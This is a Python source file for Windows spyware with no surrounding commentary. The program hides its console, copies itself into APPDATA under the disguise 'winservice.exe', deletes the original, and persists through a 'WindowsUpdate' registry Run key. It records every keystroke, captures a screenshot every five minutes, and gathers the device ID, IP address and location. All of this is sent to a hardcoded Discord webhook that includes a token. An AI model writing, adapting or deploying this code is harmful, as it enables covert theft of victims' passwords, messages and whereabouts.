import os
import sys
import time
import winreg as reg
import subprocess
import ctypes
import threading
import socket
import uuid
import json
import requests
from pynput import keyboard
from PIL import ImageGrab

# ------------------- CONFIG -------------------

STARTUP_NAME = "WindowsUpdate"
FILE_NAME = "winservice.exe"
WEBHOOK_URL = 'https://discord.com/api/webhooks/1443835712653889586/DLms4jcp2ycRkBRT6NVQbia6KY6LMLX31IRv4gvDCqqrNwMJnspOEkqY3ls5-6oIjb4f'
CREATE_NO_WINDOW = 0x08000000

# ------------------- AUTO SECTION -------------------

current_path = os.path.abspath(sys.argv[0])
target_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows")
target_path = os.path.join(target_dir, FILE_NAME)
autorun_cmd = f'"{target_path}"'

# Hide console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Move, hide, delete original, and relaunch from APPDATA
if current_path != target_path:
    os.makedirs(target_dir, exist_ok=True)
    bat_content = f"""@echo off
    timeout /t 1 >nul
    copy /Y "{current_path}" "{target_path}" >nul 2>&1
    attrib +h "{target_path}"
    del /F /Q "{current_path}" >nul 2>&1
    start "" "{target_path}"
    del "%~f0"
    """
    bat_path = os.path.join(os.environ["TEMP"], f"move_{os.getpid()}.bat")
    with open(bat_path, "w") as f:
        f.write(bat_content)
    subprocess.Popen(["cmd.exe", "/c", bat_path], creationflags=CREATE_NO_WINDOW)
    sys.exit()

# Add to startup registry
try:
    key = reg.CreateKeyEx(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key, STARTUP_NAME, 0, reg.REG_SZ, autorun_cmd)
    reg.CloseKey(key)
except:
    pass

# ------------------- GARUDA SECTION -------------------

LOCAL_DATA_FOLDER = os.path.join(target_dir, "local_data")
os.makedirs(LOCAL_DATA_FOLDER, exist_ok=True)

def is_internet_available():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except:
        return False

def get_device_id():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

def get_ip_address():
    return socket.gethostbyname(socket.gethostname())

def get_live_location():
    try:
        response = requests.get("https://ipapi.co/json/")
        if response.status_code == 200:
            data = response.json()
            return f"https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}"
    except:
        return "Location unavailable"

def send_to_discord(data):
    try:
        requests.post(WEBHOOK_URL, json={'content': str(data)})
    except:
        pass

def send_file_to_discord(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(WEBHOOK_URL, files={"file": f})
    except:
        pass

def save_data_locally(data, data_type="data"):
    timestamp = int(time.time())
    file_path = os.path.join(LOCAL_DATA_FOLDER, f"{data_type}_{timestamp}.json")
    with open(file_path, "w") as file:
        json.dump(data, file)

def capture_and_send_screenshots():
    while True:
        try:
            file_name = os.path.join(LOCAL_DATA_FOLDER, "screenshot.png")
            ImageGrab.grab().save(file_name)
            if is_internet_available():
                send_file_to_discord(file_name)
                os.remove(file_name)
        except:
            pass
        time.sleep(300)

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)
    if is_internet_available():
        send_to_discord({"keypress": key_data})
    else:
        save_data_locally({"keypress": key_data}, "keypress")

def send_saved_data():
    if is_internet_available():
        for file_name in os.listdir(LOCAL_DATA_FOLDER):
            path = os.path.join(LOCAL_DATA_FOLDER, file_name)
            try:
                with open(path, "r") as file:
                    data = json.load(file)
                    send_to_discord(data)
                    os.remove(path)
            except:
                pass

# Initial data collection
device_info = {
    'device_id': get_device_id(),
    'ip_address': get_ip_address(),
    'live_location': get_live_location()
}
if is_internet_available():
    send_to_discord(device_info)
else:
    save_data_locally(device_info)

# Start background tasks
threading.Thread(target=capture_and_send_screenshots, daemon=True).start()

# Keylogger loop
with keyboard.Listener(on_press=on_press) as listener:
    while True:
        send_saved_data()
        time.sleep(5)
